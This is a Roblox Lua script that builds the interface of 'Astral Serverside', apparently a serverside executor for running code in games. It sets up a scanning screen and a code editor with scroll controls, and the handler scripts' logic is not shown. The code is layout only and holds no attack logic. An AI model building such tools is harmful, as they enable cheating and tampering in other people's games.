local ASTRAL = {};

-- StarterGui.Astral Serverside
ASTRAL["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
ASTRAL["1"]["IgnoreGuiInset"] = true;
ASTRAL["1"]["DisplayOrder"] = 1999999999;
ASTRAL["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
ASTRAL["1"]["Name"] = [[Astral Serverside]];
ASTRAL["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
ASTRAL["1"]["ResetOnSpawn"] = false;


-- StarterGui.Astral Serverside.MainFrame
ASTRAL["2"] = Instance.new("Frame", ASTRAL["1"]);
ASTRAL["2"]["BorderSizePixel"] = 0;
ASTRAL["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
ASTRAL["2"]["ClipsDescendants"] = true;
ASTRAL["2"]["Size"] = UDim2.new(0, 450, 0, 275);
ASTRAL["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
ASTRAL["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2"]["Name"] = [[MainFrame]];
ASTRAL["2"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.Corner
ASTRAL["3"] = Instance.new("UICorner", ASTRAL["2"]);
ASTRAL["3"]["Name"] = [[Corner]];
ASTRAL["3"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border
ASTRAL["4"] = Instance.new("UIStroke", ASTRAL["2"]);
ASTRAL["4"]["Name"] = [[Border]];
ASTRAL["4"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow
ASTRAL["5"] = Instance.new("UIGradient", ASTRAL["4"]);
ASTRAL["5"]["Name"] = [[Rainbow]];
ASTRAL["5"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
ASTRAL["6"] = Instance.new("LocalScript", ASTRAL["5"]);
ASTRAL["6"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.Drag
ASTRAL["7"] = Instance.new("LocalScript", ASTRAL["2"]);
ASTRAL["7"]["Name"] = [[Drag]];


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame
ASTRAL["8"] = Instance.new("Frame", ASTRAL["2"]);
ASTRAL["8"]["Visible"] = false;
ASTRAL["8"]["BorderSizePixel"] = 0;
ASTRAL["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["8"]["ClipsDescendants"] = true;
ASTRAL["8"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["8"]["Name"] = [[ScanningFrame]];
ASTRAL["8"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Corner
ASTRAL["9"] = Instance.new("UICorner", ASTRAL["8"]);
ASTRAL["9"]["Name"] = [[Corner]];
ASTRAL["9"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Description
ASTRAL["a"] = Instance.new("TextLabel", ASTRAL["8"]);
ASTRAL["a"]["TextWrapped"] = true;
ASTRAL["a"]["TextStrokeTransparency"] = 0;
ASTRAL["a"]["BorderSizePixel"] = 0;
ASTRAL["a"]["TextSize"] = 14;
ASTRAL["a"]["TextScaled"] = true;
ASTRAL["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["a"]["BackgroundTransparency"] = 1;
ASTRAL["a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
ASTRAL["a"]["Size"] = UDim2.new(1, -50, 0, 125);
ASTRAL["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["a"]["Text"] = [[The game might freeze, don't worry it's scanning though.]];
ASTRAL["a"]["Name"] = [[Description]];
ASTRAL["a"]["Position"] = UDim2.new(0.5, 0, 0.5, 48);


-- StarterGui.Astral Serverside.MainFrame.ScanningFrame.Title
ASTRAL["b"] = Instance.new("TextLabel", ASTRAL["8"]);
ASTRAL["b"]["TextWrapped"] = true;
ASTRAL["b"]["TextStrokeTransparency"] = 0;
ASTRAL["b"]["BorderSizePixel"] = 0;
ASTRAL["b"]["TextSize"] = 14;
ASTRAL["b"]["TextScaled"] = true;
ASTRAL["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["b"]["BackgroundTransparency"] = 1;
ASTRAL["b"]["Size"] = UDim2.new(1, 0, 0, 64);
ASTRAL["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["b"]["Text"] = [[Astral Serverside]];
ASTRAL["b"]["Name"] = [[Title]];
ASTRAL["b"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
ASTRAL["c"] = Instance.new("LocalScript", ASTRAL["2"]);
ASTRAL["c"]["Name"] = [[ScanningHandler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame
ASTRAL["d"] = Instance.new("Frame", ASTRAL["2"]);
ASTRAL["d"]["BorderSizePixel"] = 0;
ASTRAL["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["d"]["ClipsDescendants"] = true;
ASTRAL["d"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["d"]["Name"] = [[ExecutionFrame]];
ASTRAL["d"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Corner
ASTRAL["e"] = Instance.new("UICorner", ASTRAL["d"]);
ASTRAL["e"]["Name"] = [[Corner]];
ASTRAL["e"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox
ASTRAL["f"] = Instance.new("Frame", ASTRAL["d"]);
ASTRAL["f"]["BorderSizePixel"] = 0;
ASTRAL["f"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
ASTRAL["f"]["AnchorPoint"] = Vector2.new(0.5, 0);
ASTRAL["f"]["ClipsDescendants"] = true;
ASTRAL["f"]["Size"] = UDim2.new(1, -50, 0, 175);
ASTRAL["f"]["Position"] = UDim2.new(0.5, 0, 0, 50);
ASTRAL["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["f"]["Name"] = [[FastColoredTextbox]];
ASTRAL["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll
ASTRAL["10"] = Instance.new("ScrollingFrame", ASTRAL["f"]);
ASTRAL["10"]["Active"] = true;
ASTRAL["10"]["ZIndex"] = 2;
ASTRAL["10"]["BorderSizePixel"] = 0;
ASTRAL["10"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
ASTRAL["10"]["TopImage"] = [[]];
ASTRAL["10"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
ASTRAL["10"]["Name"] = [[Scroll]];
ASTRAL["10"]["BottomImage"] = [[]];
ASTRAL["10"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["10"]["ScrollBarImageColor3"] = Color3.fromRGB(43, 43, 43);
ASTRAL["10"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
ASTRAL["10"]["ScrollBarThickness"] = 17;
ASTRAL["10"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextBox
ASTRAL["11"] = Instance.new("TextBox", ASTRAL["10"]);
ASTRAL["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
ASTRAL["11"]["BorderSizePixel"] = 0;
ASTRAL["11"]["TextWrapped"] = true;
ASTRAL["11"]["TextTransparency"] = 0.75;
ASTRAL["11"]["TextSize"] = 15;
ASTRAL["11"]["TextColor3"] = Color3.fromRGB(42, 42, 42);
ASTRAL["11"]["TextYAlignment"] = Enum.TextYAlignment.Top;
ASTRAL["11"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
ASTRAL["11"]["RichText"] = true;
ASTRAL["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["11"]["MultiLine"] = true;
ASTRAL["11"]["ClearTextOnFocus"] = false;
ASTRAL["11"]["Size"] = UDim2.new(10, -27, 1, 0);
ASTRAL["11"]["Position"] = UDim2.new(0, 17, 0, 0);
ASTRAL["11"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["11"]["Text"] = [[]];
ASTRAL["11"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Highlighting
ASTRAL["12"] = Instance.new("TextLabel", ASTRAL["10"]);
ASTRAL["12"]["TextWrapped"] = true;
ASTRAL["12"]["BorderSizePixel"] = 0;
ASTRAL["12"]["TextSize"] = 15;
ASTRAL["12"]["TextXAlignment"] = Enum.TextXAlignment.Left;
ASTRAL["12"]["TextYAlignment"] = Enum.TextYAlignment.Top;
ASTRAL["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["12"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["12"]["BackgroundTransparency"] = 1;
ASTRAL["12"]["RichText"] = true;
ASTRAL["12"]["Size"] = UDim2.new(10, -27, 1, 0);
ASTRAL["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["12"]["Text"] = [[]];
ASTRAL["12"]["Name"] = [[Highlighting]];
ASTRAL["12"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LineSelector
ASTRAL["13"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["13"]["ZIndex"] = -7;
ASTRAL["13"]["BorderSizePixel"] = 0;
ASTRAL["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["13"]["Size"] = UDim2.new(1, 0, 0, 15);
ASTRAL["13"]["Position"] = UDim2.new(0, 20, 0, 0);
ASTRAL["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["13"]["Name"] = [[LineSelector]];
ASTRAL["13"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.Cursor
ASTRAL["14"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["14"]["BorderSizePixel"] = 0;
ASTRAL["14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["14"]["Size"] = UDim2.new(0, 1, 0, 15);
ASTRAL["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["14"]["Name"] = [[Cursor]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.TextMeasurer
ASTRAL["15"] = Instance.new("TextLabel", ASTRAL["10"]);
ASTRAL["15"]["BorderSizePixel"] = 0;
ASTRAL["15"]["TextSize"] = 15;
ASTRAL["15"]["TextXAlignment"] = Enum.TextXAlignment.Left;
ASTRAL["15"]["TextYAlignment"] = Enum.TextYAlignment.Top;
ASTRAL["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["15"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["15"]["BackgroundTransparency"] = 1;
ASTRAL["15"]["RichText"] = true;
ASTRAL["15"]["Size"] = UDim2.new(10, -27, 1, 0);
ASTRAL["15"]["Visible"] = false;
ASTRAL["15"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["15"]["Text"] = [[]];
ASTRAL["15"]["Name"] = [[TextMeasurer]];
ASTRAL["15"]["Position"] = UDim2.new(0, 20, 0, 0);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesValue
ASTRAL["16"] = Instance.new("NumberValue", ASTRAL["10"]);
ASTRAL["16"]["Name"] = [[LinesValue]];
ASTRAL["16"]["Value"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame
ASTRAL["17"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["17"]["BorderSizePixel"] = 0;
ASTRAL["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["17"]["Size"] = UDim2.new(0, 17, 17.91826, 0);
ASTRAL["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["17"]["Name"] = [[LinesFrame]];
ASTRAL["17"]["BackgroundTransparency"] = 0.85;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.TextLabelTemplate
ASTRAL["18"] = Instance.new("TextLabel", ASTRAL["17"]);
ASTRAL["18"]["TextWrapped"] = true;
ASTRAL["18"]["BorderSizePixel"] = 0;
ASTRAL["18"]["TextSize"] = 15;
ASTRAL["18"]["TextScaled"] = true;
ASTRAL["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["18"]["TextColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["18"]["BackgroundTransparency"] = 1;
ASTRAL["18"]["Size"] = UDim2.new(0, 17, 0, 15);
ASTRAL["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["18"]["Text"] = [[1]];
ASTRAL["18"]["Name"] = [[TextLabelTemplate]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Scroll.LinesFrame.UIListLayout
ASTRAL["19"] = Instance.new("UIListLayout", ASTRAL["17"]);
ASTRAL["19"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
ASTRAL["1a"] = Instance.new("LocalScript", ASTRAL["f"]);
ASTRAL["1a"]["Name"] = [[Handler]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top
ASTRAL["1b"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["1b"]["Visible"] = false;
ASTRAL["1b"]["ZIndex"] = 3;
ASTRAL["1b"]["BorderSizePixel"] = 0;
ASTRAL["1b"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["1b"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["1b"]["Position"] = UDim2.new(1, -17, 0, 0);
ASTRAL["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["1b"]["Name"] = [[Y_Top]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow
ASTRAL["1c"] = Instance.new("Frame", ASTRAL["1b"]);
ASTRAL["1c"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["1c"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1c"]["Name"] = [[Arrow]];
ASTRAL["1c"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["1d"] = Instance.new("Frame", ASTRAL["1c"]);
ASTRAL["1d"]["BorderSizePixel"] = 0;
ASTRAL["1d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["1d"]["Size"] = UDim2.new(0, 7, 0, 1);
ASTRAL["1d"]["Position"] = UDim2.new(0, 5, 0, 9);
ASTRAL["1d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["1e"] = Instance.new("Frame", ASTRAL["1c"]);
ASTRAL["1e"]["BorderSizePixel"] = 0;
ASTRAL["1e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["1e"]["Size"] = UDim2.new(0, 5, 0, 1);
ASTRAL["1e"]["Position"] = UDim2.new(0, 6, 0, 8);
ASTRAL["1e"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["1f"] = Instance.new("Frame", ASTRAL["1c"]);
ASTRAL["1f"]["BorderSizePixel"] = 0;
ASTRAL["1f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["1f"]["Size"] = UDim2.new(0, 3, 0, 1);
ASTRAL["1f"]["Position"] = UDim2.new(0, 7, 0, 7);
ASTRAL["1f"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["1f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Arrow.Frame
ASTRAL["20"] = Instance.new("Frame", ASTRAL["1c"]);
ASTRAL["20"]["BorderSizePixel"] = 0;
ASTRAL["20"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["20"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["20"]["Position"] = UDim2.new(0, 8, 0, 6);
ASTRAL["20"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["20"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Top.Button
ASTRAL["21"] = Instance.new("TextButton", ASTRAL["1b"]);
ASTRAL["21"]["BorderSizePixel"] = 0;
ASTRAL["21"]["TextSize"] = 14;
ASTRAL["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["21"]["BackgroundTransparency"] = 1;
ASTRAL["21"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["21"]["Text"] = [[]];
ASTRAL["21"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm
ASTRAL["22"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["22"]["Visible"] = false;
ASTRAL["22"]["ZIndex"] = 3;
ASTRAL["22"]["BorderSizePixel"] = 0;
ASTRAL["22"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["22"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["22"]["Position"] = UDim2.new(1, -17, 1, -17);
ASTRAL["22"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["22"]["Name"] = [[Y_Btm]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Button
ASTRAL["23"] = Instance.new("TextButton", ASTRAL["22"]);
ASTRAL["23"]["BorderSizePixel"] = 0;
ASTRAL["23"]["TextSize"] = 14;
ASTRAL["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["23"]["BackgroundTransparency"] = 1;
ASTRAL["23"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["23"]["Text"] = [[]];
ASTRAL["23"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow
ASTRAL["24"] = Instance.new("Frame", ASTRAL["22"]);
ASTRAL["24"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["24"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["24"]["Name"] = [[Arrow]];
ASTRAL["24"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["25"] = Instance.new("Frame", ASTRAL["24"]);
ASTRAL["25"]["BorderSizePixel"] = 0;
ASTRAL["25"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["25"]["Size"] = UDim2.new(0, 7, 0, 1);
ASTRAL["25"]["Position"] = UDim2.new(0, 5, 0, 7);
ASTRAL["25"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["25"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["26"] = Instance.new("Frame", ASTRAL["24"]);
ASTRAL["26"]["BorderSizePixel"] = 0;
ASTRAL["26"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["26"]["Size"] = UDim2.new(0, 5, 0, 1);
ASTRAL["26"]["Position"] = UDim2.new(0, 6, 0, 8);
ASTRAL["26"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["26"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["27"] = Instance.new("Frame", ASTRAL["24"]);
ASTRAL["27"]["BorderSizePixel"] = 0;
ASTRAL["27"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["27"]["Size"] = UDim2.new(0, 3, 0, 1);
ASTRAL["27"]["Position"] = UDim2.new(0, 7, 0, 9);
ASTRAL["27"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["27"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Btm.Arrow.Frame
ASTRAL["28"] = Instance.new("Frame", ASTRAL["24"]);
ASTRAL["28"]["BorderSizePixel"] = 0;
ASTRAL["28"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["28"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["28"]["Position"] = UDim2.new(0, 8, 0, 10);
ASTRAL["28"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
ASTRAL["28"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft
ASTRAL["29"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["29"]["Visible"] = false;
ASTRAL["29"]["ZIndex"] = 3;
ASTRAL["29"]["BorderSizePixel"] = 0;
ASTRAL["29"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["29"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["29"]["Position"] = UDim2.new(0, 0, 1, -17);
ASTRAL["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["29"]["Name"] = [[X_Lft]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Button
ASTRAL["2a"] = Instance.new("TextButton", ASTRAL["29"]);
ASTRAL["2a"]["BorderSizePixel"] = 0;
ASTRAL["2a"]["TextSize"] = 14;
ASTRAL["2a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["2a"]["BackgroundTransparency"] = 1;
ASTRAL["2a"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["2a"]["Text"] = [[]];
ASTRAL["2a"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow
ASTRAL["2b"] = Instance.new("Frame", ASTRAL["29"]);
ASTRAL["2b"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["2b"]["Name"] = [[Arrow]];
ASTRAL["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2c"] = Instance.new("Frame", ASTRAL["2b"]);
ASTRAL["2c"]["BorderSizePixel"] = 0;
ASTRAL["2c"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2c"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["2c"]["Position"] = UDim2.new(0, 6, 0, 8);
ASTRAL["2c"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2d"] = Instance.new("Frame", ASTRAL["2b"]);
ASTRAL["2d"]["BorderSizePixel"] = 0;
ASTRAL["2d"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2d"]["Size"] = UDim2.new(0, 1, 0, 3);
ASTRAL["2d"]["Position"] = UDim2.new(0, 7, 0, 7);
ASTRAL["2d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2e"] = Instance.new("Frame", ASTRAL["2b"]);
ASTRAL["2e"]["BorderSizePixel"] = 0;
ASTRAL["2e"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2e"]["Size"] = UDim2.new(0, 1, 0, 5);
ASTRAL["2e"]["Position"] = UDim2.new(0, 8, 0, 6);
ASTRAL["2e"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Lft.Arrow.Frame
ASTRAL["2f"] = Instance.new("Frame", ASTRAL["2b"]);
ASTRAL["2f"]["BorderSizePixel"] = 0;
ASTRAL["2f"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["2f"]["Size"] = UDim2.new(0, 1, 0, 7);
ASTRAL["2f"]["Position"] = UDim2.new(0, 9, 0, 5);
ASTRAL["2f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght
ASTRAL["30"] = Instance.new("Frame", ASTRAL["f"]);
ASTRAL["30"]["Visible"] = false;
ASTRAL["30"]["ZIndex"] = 3;
ASTRAL["30"]["BorderSizePixel"] = 0;
ASTRAL["30"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["30"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["30"]["Position"] = UDim2.new(1, -18, 1, -17);
ASTRAL["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["30"]["Name"] = [[X_Rght]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Button
ASTRAL["31"] = Instance.new("TextButton", ASTRAL["30"]);
ASTRAL["31"]["BorderSizePixel"] = 0;
ASTRAL["31"]["TextSize"] = 14;
ASTRAL["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["31"]["BackgroundTransparency"] = 1;
ASTRAL["31"]["Size"] = UDim2.new(1, 0, 1, 0);
ASTRAL["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["31"]["Text"] = [[]];
ASTRAL["31"]["Name"] = [[Button]];


